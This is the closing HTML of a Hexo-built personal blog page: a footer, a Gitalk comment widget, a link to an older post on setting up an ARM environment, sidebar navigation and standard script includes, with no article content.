    </footer>

  </div>

  
    
  <nav class="article-nav">
    
    
      <a href="/2020/02/07/arm的环境搭建-简单的例题/" class="article-nav-link">
        <strong class="article-nav-caption">Olde posts</strong>
        <div class="article-nav-title">arm的环境搭建+简单的例题</div>
      </a>
    
  </nav>


  

  
    
  <div class="gitalk" id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: '',
      clientSecret: '',
      repo: '',
      owner: 'C0yo7e',
      admin: ['C0yo7e'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 The lair of C0yo7e</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>

<aside class="sidebar sidebar-specter">
  
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/time.png" alt="The lair of C0yo7e"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/gallery">Gallery</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="搜索">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
  </aside>
  <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/lazyload.min.js"></script>
<script src="/js/busuanzi-2.3.pure.min.js"></script>

  <script src="/fancybox/jquery.fancybox.min.js"></script>



  <script src="/js/tocbot.min.js"></script>
  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>


<script src="/js/ocean.js"></script>

</body>
</html>